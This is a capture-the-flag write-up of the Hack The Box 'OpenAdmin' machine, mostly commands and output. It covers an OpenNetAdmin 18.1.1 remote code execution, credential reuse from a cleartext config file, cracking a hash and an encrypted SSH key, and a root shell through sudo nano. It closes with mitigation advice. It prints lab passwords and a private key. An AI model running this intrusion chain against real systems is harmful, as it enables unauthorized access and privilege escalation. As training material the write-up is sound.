# OpenAdmin

```
root@kali:/home/kali/htb/OpenAdmin# nmap -p- -sV -sC 10.129.113.241
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 07:42 EDT
Nmap scan report for 10.129.113.241
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.46 seconds
```

I do a cursory glance on the webpage, and find nothing. I decide to do a vuln scan with nmapautomator but I don't find anything special.

I run some wfuzzes and find some interesting pages:

```
root@kali:/home/kali/htb/OpenAdmin# wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.113.241/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.113.241/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000000001:   200        375 L    964 W      10918 Ch    "# directory-list-2.3-medium.txt"                           
000000003:   200        375 L    964 W      10918 Ch    "# Copyright 2007 James Fisher"                             
000000014:   200        375 L    964 W      10918 Ch    "http://10.129.113.241/"                                    
000000013:   200        375 L    964 W      10918 Ch    "#"                                                         
000000012:   200        375 L    964 W      10918 Ch    "# on atleast 2 different hosts"                            
000000011:   200        375 L    964 W      10918 Ch    "# Priority ordered case sensative list, where entries were 
                                                        found"                                                      
000000010:   200        375 L    964 W      10918 Ch    "#"                                                         
000000009:   200        375 L    964 W      10918 Ch    "# Suite 300, San Francisco, California, 94105, USA."       
000000006:   200        375 L    964 W      10918 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of th
                                                        is"                                                         
000000008:   200        375 L    964 W      10918 Ch    "# or send a letter to Creative Commons, 171 Second Street,"
000000004:   200        375 L    964 W      10918 Ch    "#"                                                         
000000005:   200        375 L    964 W      10918 Ch    "# This work is licensed under the Creative Commons"        
000000002:   200        375 L    964 W      10918 Ch    "#"                                                         
000000007:   200        375 L    964 W      10918 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/
                                                        3.0/"                                                       
000000172:   200        355 L    1099 W     12554 Ch    "music"                                                     
000005045:   200        371 L    918 W      14461 Ch    "artwork"                                                   
000044892:   200        588 L    1674 W     43029 Ch    "sierra"                                                    
000045240:   200        375 L    964 W      10918 Ch    "http://10.129.113.241/"                                    
000095524:   403        9 L      28 W       279 Ch      "server-status"                                             

Total time: 0
Processed Requests: 220560
Filtered Requests: 220541
Requests/sec.: 0

root@kali:/home/kali/htb/OpenAdmin#
```

/music/ has a login link that redirects to http://10.129.113.241/ona/

```

Newer Version Available 	[Min/Max]
You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine

Please DOWNLOAD the latest version. 
```

The download link is http://opennetadmin.com/download.html

So we are running opennetadmin version 18.1.1

```
root@kali:/home/kali/htb/OpenAdmin# searchsploit opennet
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                              | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                               | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                | php/webapps/47691.sh
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/OpenAdmin# 
```


I google and find this https://github.com/amriunix/ona-rce


```
root@kali:/home/kali/htb/OpenAdmin# python3 ona-rce.py check http://10.129.113.241/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!
root@kali:/home/kali/htb/OpenAdmin# python3 ona-rce.py exploit http://10.129.113.241/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ whoami
www-data
sh$ 
```

I look around for a bit, there is no relative pathing. The shell is stuck in /opt/ona/www

```
sh$ ls -la local
total 20
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 .
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 ..
drwxrwxr-x  2 www-data www-data 4096 Nov 21  2019 config
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 nmap_scans
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 plugins
sh$ ls -la local/config
total 16
drwxrwxr-x 2 www-data www-data 4096 Nov 21  2019 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
sh$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?
sh$ 
```

I find some creds. There are two users on the machine, jimmy and joanna.

the password works with jimmy:

```
root@kali:/home/kali/htb/OpenAdmin# ssh jimmy@10.129.113.241
jimmy@10.129.113.241's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 15 12:38:35 UTC 2021

  System load:  0.0               Processes:             119
  Usage of /:   50.0% of 7.81GB   Users logged in:       0
  Memory usage: 25%               IP address for ens160: 10.129.113.241
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
/usr/bin/xauth:  file /home/jimmy/.Xauthority does not exist
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on openadmin.
jimmy@openadmin:~$ 
```

I upload pspy, but I don't see anything special immediately. I also upload linpeas, and save it to a text file.

In the enumeration, I see that the sudo version is 1.8.21 so I searchsploit it and find 

sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation https://www.exploit-db.com/exploits/25134

but gcc is not installed.

I also find a possible internal webserver:

```
[+] Apache server info
Version: Server version: Apache/2.4.29 (Ubuntu)                                                                              
Server built:   2019-09-16T12:58:48
/etc/apache2/sites-enabled/internal.conf:    ServerName internal.openadmin.htb
/etc/apache2/sites-enabled/openadmin.conf:      ServerName openadmin.htb
```


I check this out:

```
jimmy@openadmin:/etc/apache2$ ls -la
total 88
drwxr-xr-x  8 root root  4096 Nov 21  2019 .
drwxr-xr-x 93 root root  4096 Jan  2  2020 ..
-rw-r--r--  1 root root  7224 Sep 16  2019 apache2.conf
drwxr-xr-x  2 root root  4096 Nov 21  2019 conf-available
drwxr-xr-x  2 root root  4096 Nov 21  2019 conf-enabled
-rw-r--r--  1 root root  1782 Jul 16  2019 envvars
-rw-r--r--  1 root root 31063 Jul 16  2019 magic
drwxr-xr-x  2 root root 12288 Nov 22  2019 mods-available
drwxr-xr-x  2 root root  4096 Nov 22  2019 mods-enabled
-rw-r--r--  1 root root   320 Jul 16  2019 ports.conf
drwxr-xr-x  2 root root  4096 Nov 23  2019 sites-available
drwxr-xr-x  2 root root  4096 Nov 22  2019 sites-enabled
jimmy@openadmin:/etc/apache2$ cd sites-enabled
jimmy@openadmin:/etc/apache2/sites-enabled$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 22  2019 .
drwxr-xr-x 8 root root 4096 Nov 21  2019 ..
lrwxrwxrwx 1 root root   32 Nov 22  2019 internal.conf -> ../sites-available/internal.conf
lrwxrwxrwx 1 root root   33 Nov 22  2019 openadmin.conf -> ../sites-available/openadmin.conf
jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
jimmy@openadmin:/etc/apache2/sites-enabled$ 
```

So I port forward this:

```
root@kali:/home/kali/htb/OpenAdmin# ssh -L 52846:127.0.0.1:52846 jimmy@10.129.113.241
jimmy@10.129.113.241's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 15 13:05:02 UTC 2021

  System load:  0.0               Processes:             122
  Usage of /:   50.1% of 7.81GB   Users logged in:       0
  Memory usage: 38%               IP address for ens160: 10.129.113.241
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Mar 15 12:38:36 2021 from 10.10.14.20
jimmy@openadmin:~$ 
```


then going to localhosy:52846 I am greeted by a login page. at index.php.

my creds dont work. I seach for an index.php to find the location of this page.

```
jimmy@openadmin:/etc/apache2$ locate index.php
/var/www/html/sierra/vendors/revolution/index.php
/var/www/html/sierra/vendors/revolution/assets/svg/index.php
/var/www/html/sierra/vendors/revolution/css/index.php
/var/www/html/sierra/vendors/revolution/fonts/index.php
/var/www/html/sierra/vendors/revolution/fonts/font-awesome/index.php
/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/index.php
/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/css/index.php
/var/www/html/sierra/vendors/revolution/fonts/pe-icon-7-stroke/fonts/index.php
/var/www/html/sierra/vendors/revolution/fonts/revicons/index.php
/var/www/html/sierra/vendors/revolution/js/index.php
/var/www/html/sierra/vendors/revolution/js/extensions/index.php
/var/www/html/sierra/vendors/revolution/js/extensions/source/index.php
/var/www/html/sierra/vendors/revolution/js/source/index.php
/var/www/internal/index.php
jimmy@openadmin:/etc/apache2$ cat /var/www/internal/index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
jimmy@openadmin:/etc/apache2$
```

And we have a sha512 hash.

I search this hash on hashes.com and find:

`00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed`


So the password is Revealed.

logging into the page i get this:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

Don't forget your "ninja" password
Click here to logout Session 
```

I paste this into a file and crack it with john:


```
root@kali:/home/kali/htb/OpenAdmin# vim id_rsa
root@kali:/home/kali/htb/OpenAdmin# locate ssh2john
/home/kali/JohnTheRipper/run/ssh2john.py
/opt/JohnTheRipper/run/ssh2john.py
/usr/share/john/ssh2john.py
root@kali:/home/kali/htb/OpenAdmin# /opt/JohnTheRipper/run/ssh2john.py id_rsa > rsa_hash
root@kali:/home/kali/htb/OpenAdmin# john rsa_hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2021-03-15 09:12) 0.3095g/s 4440Kp/s 4440Kc/s 4440KC/sa6_123..*7¡Vamos!
Session completed
root@kali:/home/kali/htb/OpenAdmin# 
```

I then try this with ssh joanna:

```
root@kali:/home/kali/htb/OpenAdmin# chmod 400 id_rsa
root@kali:/home/kali/htb/OpenAdmin# ssh -i id_rsa joanna@10.129.113.241
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 15 13:13:32 UTC 2021

  System load:  0.0               Processes:             127
  Usage of /:   50.4% of 7.81GB   Users logged in:       1
  Memory usage: 39%               IP address for ens160: 10.129.113.241
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
/usr/bin/xauth:  file /home/joanna/.Xauthority does not exist
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ 
```


And we have a sudo nano.

I check gtfobins: https://gtfobins.github.io/gtfobins/nano/

And execute the shell:

```
joanna@openadmin:~$ sudo /bin/nano /opt/priv

ctrl+R
ctrl+X

Command to execute: reset; sh 1>&0 2>&0                                                                                                                                     
# # et Help                                                                           ^X Read File
#  Cancel                                                                             M-F New Buffer
# 
# 
# whoami
root
# 
       
```

And we have root :)


## Comparing myself to the official writeup:

After finding the webpage they fuzz it with ffuf. 

The results are thrown into a python script that scrape the navigation links of the found pages. I'm definitely stealing this.

This leads them to find the /ona link.

They use the ona exploit and get shell.

They also reveal an LFI to upload a test.php module which can execute commands.

they use linpeas, but do not see the internal apache data.

They do find it manually however.

They get the creds from the database, and log in as jimmy.

They discover the internal server running on port 52846 and find the index.php page with the hash.

They port forward and find the login, get the ssh.

They also reveal that main.php does not check for authentication before returning the ssh key.

The user could also write a php shell to the internal folder.

they find the sudo nano command and escape the interface as root.



## How to stop this exploit:

The opennetadmin should be updated, to patch the exploit.

Having credentials be stored cleartext in a conf file is not a good idea, and neither is reusing passwords.

The internal webserver has hardcoded the password in the .php file which is not good, set up a database and hash and salt it, so that no one can access it.

This leading to a ssh key is just poor security practice. What is the point of having different passwords if one unlocks the other?

And finally giving sudo access to any user is a bad idea. Bound to be exploited. Even if the exploit is not currently known, it could become an issue in the future.